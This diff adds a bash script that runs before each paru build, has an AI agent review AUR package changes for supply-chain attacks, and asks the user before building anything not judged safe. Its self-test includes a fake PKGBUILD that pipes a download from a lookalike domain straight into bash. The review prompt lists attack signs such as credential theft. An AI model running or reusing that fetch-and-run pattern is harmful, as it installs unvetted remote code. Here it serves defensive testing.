@@ -1,0 +1,233 @@
+#!/bin/bash
+# AI review of AUR package changes, wired as paru's PreBuildCommand.
+# paru runs this via `sh -c` with cwd = the package's PKGBUILD dir (the git
+# clone in ~/.cache/paru/clone/<pkgbase>) and PKGBASE / VERSION in the env.
+# A non-zero exit aborts the whole paru install.
+#
+# Verdict protocol: the agent must end its reply with one of
+#   VERDICT: SAFE | VERDICT: SUSPICIOUS | VERDICT: MALICIOUS
+# SAFE records the commit as reviewed and lets the build through. Anything
+# else (including agent failure) asks on /dev/tty whether to proceed.
+#
+# Config: AUR_REVIEW=off disables entirely, AUR_REVIEW_AGENT=claude|codex|...
+# swaps the reviewer. State + log live in
+# ${XDG_STATE_HOME:-~/.local/state}/aur-ai-review/.
+#
+# Manual test: `aur-ai-review --self-test [safe|suspicious]` reviews a
+# synthetic PKGBUILD in a temp dir (safe = benign, suspicious = curl|bash
+# installer that should trigger the block/ack path).
+
+set -u
+
+# --- self-test ---------------------------------------------------------------
+if [[ ${1:-} == "--self-test" ]]; then
+  flavor=${2:-safe}
+  selftest_dir=$(mktemp -d /tmp/aur-ai-review-test.XXXXXX)
+  trap 'rm -rf "$selftest_dir"' EXIT
+  cd "$selftest_dir" || exit 1
+  if [[ $flavor == suspicious ]]; then
+    cat >PKGBUILD <<'EOF'
+pkgname=totally-legit
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+source=("https://cdn.example-softwre.com/install.sh")
+sha256sums=(SKIP)
+package() {
+  curl -sL https://cdn.example-softwre.com/payload.sh | bash
+  install -Dm755 /dev/null "$pkgdir/usr/bin/totally-legit"
+}
+EOF
+  else
+    cat >PKGBUILD <<'EOF'
+pkgname=hello-safe
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+source=("https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz")
+sha256sums=(SKIP)
+package() {
+  install -Dm755 /dev/null "$pkgdir/usr/bin/hello-safe"
+}
+EOF
+  fi
+  export PKGBASE="selftest-$flavor" VERSION=selftest
+fi
+
+# --- context fix ------------------------------------------------------------
+# Omarchy's update runs as root (omarchy-update is requires-sudo), so paru's
+# PreBuildCommand can land here as root with a minimal PATH and HOME=/root —
+# no agent binary in PATH and no user credentials. Re-exec as the real user
+# with their HOME and an explicit PATH covering the agent install locations.
+if ((EUID == 0)); then
+  real_user=${SUDO_USER:-$(stat -c %U "$PWD" 2>/dev/null)}
+  real_home=$(getent passwd "${real_user:-}" 2>/dev/null | cut -d: -f6)
+  if [[ -n ${real_user:-} && $real_user != root && -n ${real_home:-} ]] && command -v runuser >/dev/null; then
+    exec runuser -u "$real_user" -- env \
+      HOME="$real_home" \
+      PATH="$real_home/.kimi-code/bin:$real_home/.local/bin:$real_home/.local/share/mise/shims:/usr/local/bin:/usr/bin:/bin" \
+      "$0" "$@"
+  fi
+fi
+
+AGENT=${AUR_REVIEW_AGENT:-kimi}
+STATE_DIR=${XDG_STATE_HOME:-$HOME/.local/state}/aur-ai-review
+MAX_BYTES=60000
+
+[[ ${AUR_REVIEW:-on} == "off" ]] && exit 0
+
+# Clone dirs can be root-owned when paru ran under sudo.
+export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=safe.directory GIT_CONFIG_VALUE_0='*'
+
+# Resolve the agent binary even when PATH is sparse (non-interactive contexts).
+resolve_agent() {
+  command -v "$AGENT" &>/dev/null && return 0
+  local p
+  for p in "$HOME/.kimi-code/bin/$AGENT" "$HOME/.local/bin/$AGENT" "$HOME/.local/share/mise/shims/$AGENT"; do
+    [[ -x $p ]] && { AGENT=$p; return 0; }
+  done
+  return 1
+}
+
+pkgbase=${PKGBASE:-$(basename "$PWD")}
+version=${VERSION:-unknown}
+mkdir -p "$STATE_DIR"
+state_file="$STATE_DIR/$pkgbase.commit"
+log_file="$STATE_DIR/reviews.log"
+
+say() { printf '\033[1;36m[aur-ai-review]\033[0m %s\n' "$*"; }
+
+ask_proceed() {
+  local reason=$1 reply
+  say "$reason"
+  if ! printf '' 2>/dev/null >/dev/tty; then
+    say "no controlling terminal for confirmation — refusing to proceed."
+    return 1
+  fi
+  printf '\033[1;33m[aur-ai-review]\033[0m Proceed with building %s anyway? [y/N] ' "$pkgbase" >/dev/tty
+  read -r reply </dev/tty || reply=""
+  [[ $reply == [yY]* ]]
+}
+
+# --- gather review material ------------------------------------------------
+
+material=""
+mode="full"
+
+if [[ -d .git ]] && git rev-parse --is-inside-work-tree &>/dev/null; then
+  last=$(cat "$state_file" 2>/dev/null || true)
+  if [[ -n $last ]] && git cat-file -e "$last^{commit}" 2>/dev/null; then
+    if [[ $(git rev-parse HEAD) == "$last" ]]; then
+      say "$pkgbase: unchanged since last review, skipping."
+      exit 0
+    fi
+    mode="diff"
+    material="Changes since last reviewed commit $last:
+$(git --no-pager log --oneline "$last..HEAD" | head -20)
+
+$(git --no-pager diff "$last..HEAD" -- . 2>/dev/null)"
+    # files added but not yet committed (review edits) are not in the diff
+    untracked=$(git ls-files --others --exclude-standard)
+    [[ -n $untracked ]] && material+="
+
+Untracked files present:
+$untracked"
+  fi
+fi
+
+if [[ -z $material ]]; then
+  material="Full review (no previous review on record). Files in package:
+$(ls -la)
+
+=== PKGBUILD ===
+$(cat PKGBUILD 2>/dev/null)"
+  [[ -f .SRCINFO ]] && material+="
+
+=== .SRCINFO ===
+$(cat .SRCINFO)"
+  for f in *.install *.patch *.diff; do
+    [[ -f $f ]] && material+="
+
+=== $f ===
+$(cat "$f")"
+  done
+fi
+
+# keep the prompt inside sane size limits
+if ((${#material} > MAX_BYTES)); then
+  material="${material:0:$MAX_BYTES}
+
+[... truncated, ${#material} bytes total ...]"
+fi
+
+# --- ask the agent ----------------------------------------------------------
+
+prompt="You are reviewing Arch Linux AUR packaging changes for supply-chain attacks before the package is built and installed. Package: $pkgbase (version $version). Review mode: $mode.
+
+Red flags to look for:
+- source URLs moved to unofficial/lookalike domains, IP literals, or URL shorteners
+- downloads piped to shells (curl|sh), or binaries executed outside \$srcdir
+- base64/hex blobs, obfuscation, or minified scripts that hide payloads
+- .install scripts adding users, cron jobs, systemd units, ld.so.preload entries, SSH keys, or touching files outside the package
+- checksums removed or replaced with SKIP where they were real before
+- prepare()/build()/package() steps exfiltrating data or reading \$HOME, SSH keys, browser profiles, or credentials
+- anything unrelated to the package's stated purpose
+
+Most AUR updates are benign version bumps (pkgver/checksum changes). Do not flag those. Judge only what is in the material below; if there is nothing suspicious, say so.
+
+Reply with at most 10 lines of findings, then exactly one final line:
+VERDICT: SAFE
+or VERDICT: SUSPICIOUS
+or VERDICT: MALICIOUS
+
+=== REVIEW MATERIAL ===
+$material"
+
+say "$pkgbase $version: asking $AGENT to review ($mode)…"
+if ! resolve_agent; then
+  printf '%s\t%s\t%s\tAGENT-MISSING\n' "$(date -Is)" "$pkgbase" "$version" >>"$log_file"
+  ask_proceed "$AGENT not found (tried PATH, ~/.kimi-code/bin, ~/.local/bin, mise shims) — nothing was reviewed." || exit 1
+  exit 0
+fi
+# Agent CLIs spell headless mode differently; add cases as needed.
+case ${AGENT##*/} in
+codex) output=$(timeout 240 "$AGENT" exec --skip-git-repo-check "$prompt" 2>&1) ;;
+*) output=$(timeout 240 "$AGENT" -p "$prompt" 2>&1) ;; # kimi, claude, ...
+esac
+rc=$?
+
+printf '%s\n' "$output"
+
+if ((rc != 0)); then
+  printf '%s\t%s\t%s\tAGENT-ERROR (rc=%d)\n' "$(date -Is)" "$pkgbase" "$version" "$rc" >>"$log_file"
+  ask_proceed "AI review failed (rc=$rc) — nothing was reviewed." || exit 1
+  exit 0
+fi
+
+verdict=$(grep -oE 'VERDICT: (SAFE|SUSPICIOUS|MALICIOUS)' <<<"$output" | tail -1)
+verdict=${verdict#VERDICT: }
+printf '%s\t%s\t%s\t%s\n' "$(date -Is)" "$pkgbase" "$version" "${verdict:-NO-VERDICT}" >>"$log_file"
+
+mark_reviewed() {
+  git rev-parse HEAD >"$state_file" 2>/dev/null || true
+}
+
+case ${verdict:-} in
+SAFE)
+  mark_reviewed
+  say "$pkgbase: SAFE — proceeding."
+  exit 0
+  ;;
+SUSPICIOUS | MALICIOUS)
+  ask_proceed "Agent verdict: $verdict" || {
+    say "$pkgbase: build aborted by user."
+    exit 1
+  }
+  mark_reviewed # user acknowledged this diff; next run reviews from here
+  exit 0
+  ;;
+*)
+  ask_proceed "Agent gave no verdict — treat as unreviewed." || exit 1
+  exit 0
+  ;;
+esac
